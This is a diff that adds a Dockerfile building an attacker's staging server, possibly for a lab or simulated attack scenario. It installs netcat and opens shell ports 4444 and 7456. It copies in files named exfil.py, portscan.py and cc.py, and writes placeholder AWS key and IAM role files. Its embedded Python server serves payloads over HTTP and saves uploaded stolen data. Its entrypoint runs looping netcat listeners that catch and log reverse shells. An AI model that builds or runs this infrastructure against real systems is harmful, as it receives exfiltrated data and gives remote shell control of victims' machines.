@@ -1,0 +1,113 @@
+FROM python:3.9-slim
+
+ENV DEBIAN_FRONTEND=noninteractive \
+    TZ=Etc/UTC \
+    HTTP_PORT=8080 \
+    SHELL_PORT_1=4444 \
+    SHELL_PORT_2=7456 \
+    ATTACK_DEBUG=0
+
+RUN apt-get update && \
+    apt-get install -y --no-install-recommends \
+        curl wget netcat-openbsd netcat-traditional && \
+    rm -rf /var/lib/apt/lists/*
+
+RUN mkdir -p /payloads/uploads /payloads/shells
+
+COPY xmx2 www cc.py pt xmx2.so run.sh noumt config.json exfil.py portscan.py /payloads/
+RUN chmod +x /payloads/*
+
+RUN echo '{"RoleName":"example-k8s-admin-role"}' > /payloads/iam-role && \
+    echo '{"AccessKeyId":"AKIAEXAMPLE"}' > /payloads/aws-keys
+
+EXPOSE $HTTP_PORT $SHELL_PORT_1 $SHELL_PORT_2 4445
+
+RUN echo '#!/usr/bin/env python3\n\
+import http.server\n\
+import socketserver\n\
+import os\n\
+import cgi\n\
+from datetime import datetime\n\
+\n\
+PORT = int(os.environ.get("HTTP_PORT", 8080))\n\
+DEBUG = os.environ.get("ATTACK_DEBUG", "0") == "1"\n\
+UPLOAD_DIR = "/payloads/uploads"\n\
+\n\
+os.makedirs(UPLOAD_DIR, exist_ok=True)\n\
+\n\
+def log(msg):\n\
+    if DEBUG: print(msg, flush=True)\n\
+\n\
+class Handler(http.server.BaseHTTPRequestHandler):\n\
+    def log_message(self, format, *args):\n\
+        if DEBUG: super().log_message(format, *args)\n\
+\n\
+    def do_GET(self):\n\
+        log(f"GET {self.path}")\n\
+        try:\n\
+            filepath = f"/payloads{self.path if self.path != "/" else "/index.html"}"\n\
+            if os.path.exists(filepath) and os.path.isfile(filepath):\n\
+                with open(filepath, "rb") as f:\n\
+                    self.send_response(200)\n\
+                    self.send_header("Content-type", "application/octet-stream")\n\
+                    self.end_headers()\n\
+                    self.wfile.write(f.read())\n\
+            else:\n\
+                self.send_response(404)\n\
+                self.end_headers()\n\
+                self.wfile.write(b"Not found")\n\
+        except Exception as e:\n\
+            log(f"Error: {e}")\n\
+            self.send_response(500)\n\
+            self.end_headers()\n\
+\n\
+    def do_POST(self):\n\
+        log(f"POST {self.path}")\n\
+        try:\n\
+            form = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={"REQUEST_METHOD": "POST"})\n\
+            ts = datetime.now().strftime("%Y%m%d_%H%M%S")\n\
+\n\
+            if "file" in form:\n\
+                item = form["file"]\n\
+                if item.file:\n\
+                    fname = f"{ts}_{item.filename if hasattr(item, \"filename\") and item.filename else \"data.bin\"}"\n\
+                    fpath = os.path.join(UPLOAD_DIR, fname)\n\
+                    with open(fpath, "wb") as f:\n\
+                        f.write(item.file.read())\n\
+                    log(f"Saved: {fpath} ({os.path.getsize(fpath)} bytes)")\n\
+                    self.send_response(200)\n\
+                    self.end_headers()\n\
+                    self.wfile.write(b"OK")\n\
+                    return\n\
+\n\
+            content_length = int(self.headers.get("Content-Length", 0))\n\
+            if content_length > 0:\n\
+                data = self.rfile.read(content_length)\n\
+                fpath = os.path.join(UPLOAD_DIR, f"{ts}_data.bin")\n\
+                with open(fpath, "wb") as f:\n\
+                    f.write(data)\n\
+                log(f"Saved: {fpath}")\n\
+                self.send_response(200)\n\
+                self.end_headers()\n\
+                self.wfile.write(b"OK")\n\
+            else:\n\
+                self.send_response(400)\n\
+                self.end_headers()\n\
+        except Exception as e:\n\
+            log(f"Error: {e}")\n\
+            self.send_response(500)\n\
+            self.end_headers()\n\
+\n\
+socketserver.TCPServer.allow_reuse_address = True\n\
+print(f"Server starting on port {PORT} (DEBUG={DEBUG})")\n\
+with socketserver.TCPServer(("", PORT), Handler) as httpd:\n\
+    httpd.serve_forever()\n' > /payloads/server.py && chmod +x /payloads/server.py
+
+RUN echo '#!/bin/bash\n\
+NC_BIN=$(command -v nc.traditional || command -v nc.openbsd || command -v nc)\n\
+echo "Starting listeners on ports $SHELL_PORT_1, $SHELL_PORT_2"\n\
+while true; do $NC_BIN -l -p $SHELL_PORT_1 -v 2>&1 | tee -a /payloads/shells/shell_$SHELL_PORT_1.log; sleep 1; done &\n\
+while true; do $NC_BIN -l -p $SHELL_PORT_2 -v 2>&1 | tee -a /payloads/shells/shell_$SHELL_PORT_2.log; sleep 1; done &\n\
+cd /payloads && python3 server.py\n' > /entrypoint.sh && chmod +x /entrypoint.sh
+
+CMD ["/entrypoint.sh"]
